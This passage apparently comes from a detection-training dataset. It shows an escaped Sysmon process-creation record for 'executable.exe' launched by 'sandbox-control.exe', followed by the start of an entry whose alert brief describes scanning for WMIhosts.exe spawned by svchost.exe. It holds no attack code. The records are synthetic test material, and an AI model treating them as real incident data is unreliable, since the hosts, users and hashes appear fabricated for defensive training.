            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\executable.exe\\\" \",\"Company\":\"-\",\"Computer\":\"DESKTOP-SM\",\"CurrentDirectory\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=71826BA081E303866CE2A2534491A2F7,SHA256=62099532750DAD1054B127689680C38590033FA0BDFA4FB40C7B4DCB2607FB11,IMPHASH=AFCDF79BE1557326C854B6E20CB900A7\",\"Hostname\":\"stevemorris-pc\",\"Image\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\executable.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-A5DD-61A4-355F-030000000000}\",\"LogonId\":\"0x35f35\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"\\\"sandbox-control.exe\\\"\",\"ParentImage\":\"sandbox-control.exe\",\"ParentProcessGuid\":\"{C784477D-A6BC-61A4-F705-000000003C00}\",\"ParentProcessId\":\"6400\",\"ProcessGuid\":\"{C784477D-F8D0-6221-2706-000000003C00}\",\"ProcessID\":2200,\"ProcessId\":\"3848\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":84589,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":3056,\"User\":\"DESKTOP-SM\\\\stevemorris\",\"UserID\":\"S-1-5-12-783622181-14434791-6080415151-691320\",\"UtcTime\":\"2024-11-30 05:32:14.000000\",\"Version\":5}\r\nudm.principal.process.file.full_path: sandbox-control.exe"
        ]
    },
    "64": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityWMIhosts.exe launched by svchost.exe",
        "ini_data": [
